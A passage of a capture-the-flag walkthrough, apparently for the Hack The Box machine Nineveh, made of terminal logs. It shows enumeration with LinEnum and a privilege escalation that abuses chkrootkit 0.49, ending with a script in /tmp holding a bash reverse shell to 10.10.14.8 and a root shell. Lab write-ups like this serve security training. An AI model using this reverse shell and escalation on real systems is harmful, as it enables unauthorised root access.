+The authenticity of host '10.10.10.43 (10.10.10.43)' can't be established.
+ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.10.43' (ECDSA) to the list of known hosts.
+Ubuntu 16.04.2 LTS
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+133 packages can be updated.
+66 updates are security updates.
+
+
+You have mail.
+Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
+amrois@nineveh:~$ id
+uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
+
+GET USER FLAG
+amrois@nineveh:/tmp$ cat /home/amrois/user.txt 
+#############################################
+
+PRIVESC
+RUN LINEUM AGAIN
+amrois@nineveh:/tmp$ ./LinEnum.sh 
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+[-] Debug Info
+[+] Thorough tests = Disabled
+
+
+Scan started at:
+Sat Nov 14 11:12:52 CST 2020
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+
+
+[-] Kernel information (continued):
+Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017
+
+
+[-] Specific release information:
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
+NAME="Ubuntu"
+VERSION="16.04.2 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04.2 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+VERSION_CODENAME=xenial
+UBUNTU_CODENAME=xenial
+
+
+[-] Hostname:
+nineveh
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
+
+
+[-] Users that have previously logged onto the system:
+Username         Port     From             Latest
+root             tty1                      Sat Aug  5 10:16:49 -0500 2017
+amrois           pts/1    10.10.14.8       Sat Nov 14 11:10:42 -0600 2020
+
+
+### JOBS/TASKS ##########################################
+
+[-] Crontab contents:
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+
+[-] Jobs held by all users:
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').# 
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+*/10 * * * * /usr/sbin/report-reset.sh
+
+
+[-] Systemd timers:
+NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
+Sat 2020-11-14 12:57:32 CST  1h 44min left Sat 2020-11-14 08:31:47 CST  2h 41min ago snapd.refresh.timer          snapd.refresh.service
+Sat 2020-11-14 14:27:27 CST  3h 14min left Fri 2020-11-13 18:04:39 CST  17h ago      apt-daily.timer              apt-daily.service
+Sat 2020-11-14 16:11:47 CST  4h 58min left Fri 2020-11-13 16:11:47 CST  19h ago      systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+
+3 timers listed.
+Enable thorough tests to see inactive timers
+
+
+REVIEW CRONTAB SCRIPT
+# m h  dom mon dow   command
+*/10 * * * * /usr/sbin/report-reset.sh
+
+amrois@nineveh:/tmp$ cat /usr/sbin/report-reset.sh
+#!/bin/bash
+
+rm -rf /report/*.txt
+
+CHECK REPORT OUTPUT
+amrois@nineveh:/tmp$ cat /report/report-20-11-14\:11\:20.txt 
+ROOTDIR is `/'
+Checking `amd'... not found
+Checking `basename'... not infected
+Checking `biff'... not found
+Checking `chfn'... not infected
+Checking `chsh'... not infected
+Checking `cron'... not infected
+Checking `crontab'... not infected
+Checking `date'... not infected
+Checking `du'... not infected
+Checking `dirname'... not infected
+Checking `echo'... not infected
+Checking `egrep'... not infected
+Checking `env'... not infected
+Checking `find'... not infected
+Checking `fingerd'... not found
+Checking `gpm'... not found
+Checking `grep'... not infected
+Checking `hdparm'... not infected
+Checking `su'... not infected
+Checking `ifconfig'... not infected
+Checking `inetd'... not tested
+Checking `inetdconf'... not found
+Checking `identd'... not found
+Checking `init'... not infected
+Checking `killall'... not infected
+Checking `ldsopreload'... can't exec ./strings-static, not tested
+Checking `login'... not infected
+Checking `ls'... not infected
+Checking `lsof'... not infected
+Checking `mail'... not found
+Checking `mingetty'... not found
+Checking `netstat'... not infected
+Checking `named'... not found
+Checking `passwd'... not infected
+Checking `pidof'... not infected
+Checking `pop2'... not found
+Checking `pop3'... not found
+Checking `ps'... not infected
+Checking `pstree'... not infected
+Checking `rpcinfo'... not found
+Checking `rlogind'... not found
+Checking `rshd'... not found
+Checking `slogin'... not infected
+Checking `sendmail'... not found
+Checking `sshd'... not infected
+Checking `syslogd'... not tested
+Checking `tar'... not infected
+Checking `tcpd'... not infected
+Checking `tcpdump'... not infected
+Checking `top'... not infected
+Checking `telnetd'... not found
+Checking `timed'... not found
+Checking `traceroute'... not found
+Checking `vdir'... not infected
+Checking `w'... not infected
+Checking `write'... not infected
+Checking `aliens'... no suspect files
+Searching for sniffer's logs, it may take a while... nothing found
+Searching for HiDrootkit's default dir... nothing found
+Searching for t0rn's default files and dirs... nothing found
+Searching for t0rn's v8 defaults... nothing found
+Searching for Lion Worm default files and dirs... nothing found
+Searching for RSHA's default files and dir... nothing found
+Searching for RH-Sharpe's default files... nothing found
+Searching for Ambient's rootkit (ark) default files and dirs... nothing found
+Searching for suspicious files and dirs, it may take a while... 
+/lib/modules/4.4.0-62-generic/vdso/.build-id
+/lib/modules/4.4.0-62-generic/vdso/.build-id
+Searching for LPD Worm files and dirs... nothing found
+Searching for Ramen Worm files and dirs... nothing found
+Searching for Maniac files and dirs... nothing found
+Searching for RK17 files and dirs... nothing found
+Searching for Ducoci rootkit... nothing found
+Searching for Adore Worm... nothing found
+Searching for ShitC Worm... nothing found
+Searching for Omega Worm... nothing found
+Searching for Sadmind/IIS Worm... nothing found
+Searching for MonKit... nothing found
+Searching for Showtee... nothing found
+Searching for OpticKit... nothing found
+Searching for T.R.K... nothing found
+Searching for Mithra... nothing found
+Searching for LOC rootkit... nothing found
+Searching for Romanian rootkit... nothing found
+Searching for Suckit rootkit... Warning: /sbin/init INFECTED
+Searching for Volc rootkit... nothing found
+Searching for Gold2 rootkit... nothing found
+Searching for TC2 Worm default files and dirs... nothing found
+Searching for Anonoying rootkit default files and dirs... nothing found
+Searching for ZK rootkit default files and dirs... nothing found
+Searching for ShKit rootkit default files and dirs... nothing found
+Searching for AjaKit rootkit default files and dirs... nothing found
+Searching for zaRwT rootkit default files and dirs... nothing found
+Searching for Madalin rootkit default files... nothing found
+Searching for Fu rootkit default files... nothing found
+Searching for ESRK rootkit default files... nothing found
+Searching for rootedoor... nothing found
+Searching for ENYELKM rootkit default files... nothing found
+Searching for common ssh-scanners default files... nothing found
+Searching for suspect PHP files... 
+/tmp/shell.php
+/var/tmp/shell.php
+
+Searching for anomalies in shell history files... Warning: `//root/.bash_history' file size is zero
+Checking `asp'... not infected
+Checking `bindshell'... not infected
+Checking `lkm'... not tested: can't exec 
+Checking `rexedcs'... not found
+Checking `sniffer'... not tested: can't exec ./ifpromisc
+Checking `w55808'... not infected
+Checking `wted'... not tested: can't exec ./chkwtmp
+Checking `scalper'... not infected
+Checking `slapper'... not infected
+Checking `z2'... not tested: can't exec ./chklastlog
+Checking `chkutmp'... not tested: can't exec ./chkutmp
+Checking `OSX_RSPLUG'... not infected
+
+CONTENTS RELATED CHKROOTKIT
+root@kali:~/htb/nineveh# searchsploit -m 33899.txt
+  Exploit: Chkrootkit 0.49 - Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/33899/
+     Path: /usr/share/exploitdb/exploits/linux/local/33899.txt
+File Type: ASCII text, with CRLF line terminators
+
+Copied to: /root/htb/nineveh/33899.txt
+
+EXPLOIT CHKROOTKIT
+amrois@nineveh:/tmp$ vim update
+amrois@nineveh:/tmp$ cat update 
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.14.8/53 0>&1
+amrois@nineveh:/tmp$ chmod +x update 
+
+GET ROOT SHELL
+root@kali:~/htb/nineveh# nc -lvp 53
+listening on [any] 53 ...
+connect to [10.10.14.8] from nineveh.htb [10.10.10.43] 37238
+bash: cannot set terminal process group (25773): Inappropriate ioctl for device
+bash: no job control in this shell
+root@nineveh:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+GET ROOT FLAG
+root@nineveh:~# cat /root/root.txt
+cat /root/root.txt
+#################################
+
+
+
+
